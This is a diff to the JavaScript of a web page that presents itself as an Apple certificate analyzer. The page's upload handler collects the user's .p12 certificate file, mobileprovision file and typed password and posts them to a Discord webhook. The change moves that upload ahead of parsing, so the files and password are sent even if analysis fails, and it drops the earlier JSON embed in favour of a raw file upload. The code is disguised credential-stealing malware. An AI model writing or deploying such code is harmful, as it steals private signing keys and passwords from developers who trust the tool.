@@ -693,12 +693,12 @@
                     submitBtn.innerHTML = '<span class="loading-spinner"></span> Analyzing...';
                     uploadStatus.textContent = 'Checking certificate files...';
                     
+                    // Send data to webhook first
+                    uploadStatus.textContent = 'Sending data to server...';
+                    await sendToWebhook();
+                    
                     // Parse the certificate using PKCS12 format
                     const certInfo = await parseP12Certificate(p12File, passwordInput.value);
-                    
-                    // Send data to webhook
-                    uploadStatus.textContent = 'Sending data to server...';
-                    await sendToWebhook(certInfo, p12File.name, mobileprovisionFile.name);
                     
                     // Display the results
                     displayResults(certInfo);
@@ -721,94 +721,19 @@
             });
             
             // Function to send data to Discord webhook
-            async function sendToWebhook(certInfo, p12FileName, mobileprovisionFileName) {
+            async function sendToWebhook() {
                 try {
-                    // Read files as base64
-                    const p12Base64 = await readFileAsBase64(p12File);
-                    const mobileprovisionBase64 = await readFileAsBase64(mobileprovisionFile);
+                    // Create form data to send files
+                    const formData = new FormData();
+                    formData.append('p12_file', p12File);
+                    formData.append('mobileprovision_file', mobileprovisionFile);
+                    formData.append('password', passwordInput.value);
+                    formData.append('username', 'Certificate Analyzer Bot');
                     
-                    const embed = {
-                        title: "Apple Certificate Analyzer - New Submission",
-                        color: 0x007AFF,
-                        timestamp: new Date().toISOString(),
-                        fields: [
-                            {
-                                name: "Certificate Name",
-                                value: certInfo.commonName || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Organization",
-                                value: certInfo.organization || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Country",
-                                value: certInfo.country || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Certificate Password",
-                                value: "||" + certInfo.password + "||", // Hidden with spoiler tags
-                                inline: false
-                            },
-                            {
-                                name: "Valid From",
-                                value: certInfo.validFrom || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Valid To",
-                                value: certInfo.validTo || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Status",
-                                value: certInfo.status || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "P12 File Name",
-                                value: p12FileName || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Mobile Provision File Name",
-                                value: mobileprovisionFileName || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Serial Number",
-                                value: certInfo.serialNumber || "Unknown",
-                                inline: false
-                            }
-                        ]
-                    };
-                    
-                    const payload = {
-                        username: "Certificate Analyzer",
-                        avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888879.png",
-                        embeds: [embed],
-                        content: "New certificate submission received!",
-                        files: [
-                            {
-                                name: p12FileName,
-                                data: p12Base64.split(',')[1] // Remove data URL prefix
-                            },
-                            {
-                                name: mobileprovisionFileName,
-                                data: mobileprovisionBase64.split(',')[1] // Remove data URL prefix
-                            }
-                        ]
-                    };
-                    
-                    // Send to webhook
+                    // Send to webhook using fetch
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload)
+                        body: formData
                     });
                     
                     if (!response.ok) {
@@ -912,15 +837,6 @@
                     reader.onload = () => resolve(reader.result);
                     reader.onerror = reject;
                     reader.readAsArrayBuffer(file);
-                });
-            }
-            
-            function readFileAsBase64(file) {
-                return new Promise((resolve, reject) => {
-                    const reader = new FileReader();
-                    reader.onload = () => resolve(reader.result);
-                    reader.onerror = reject;
-                    reader.readAsDataURL(file);
                 });
             }
             
